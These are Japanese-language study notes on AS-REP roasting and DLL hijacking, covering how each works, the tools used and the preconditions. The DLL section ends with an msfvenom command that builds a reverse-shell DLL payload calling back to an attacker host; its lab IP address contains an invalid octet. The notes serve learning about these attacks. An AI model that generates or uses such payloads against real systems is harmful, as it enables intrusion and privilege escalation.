# 知っている攻撃手法の詳細を記録していく

## AS-REP Roasting
**AS-REP roastingは、Kerberos pre authenticationなしでユーザからパスワードハッシュを取得できる攻撃**のことを指す。
Kerberosへの認証において、まずはAS-REQを送信するというステップがある。この要求に基づいてDCは認証成功を判断する。  
**認証に成功すると、DCはセッションキーとTGTを含むAS-REPを返す。**  
ユーザ名のパスワードとハッシュから生成したハッシュを使って暗号化されたタイムスタンプをAS-REQにのせてユーザの認証をDCに頼むという流れを、**Kerberos Pre Authentication**と呼ぶ。この機能が有効だとAS-REP roastingはできない。  
このKerberos pre authenticationがDC側で有効になっていない場合、攻撃者は任意のADユーザに代わってDCにAS-REQを返すよう要求ができる。

### 攻撃で使用できるツール
- Rubeus
- impacket-GetNPUsers
### 攻撃の条件
- DCのIPアドレスが分かっている
- AS-REQを送る際になりすますユーザの属するドメイン名が分かっている
- AS-REQを送る際になりすますドメインの、有効なユーザ名が分かっている
- Kerberosのポート(88番)と通信できる
- DC側の設定で、ターゲットユーザアカウントのKerberos pre authenticationが有効になっていない


## DLL Hijacking
.exeバイナリやそのバイナリに紐づいたサービスは、起動時にDLLを探す。  
**これらのDLLが存在しないかDLLが絶対パスを使わずに呼び出されるといったケースで、バイナリやサービスに悪意のあるDLLファイルを強制的にロード&実行させて権限昇格することができる。**  
  
msfvenom等でバイナリを生成し、DLLやバイナリを生成してリバースシェルを実行すると権限昇格に成功するなどできる。  
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.293.22 LPORT=4444 -f dll -o hoge.dll
```
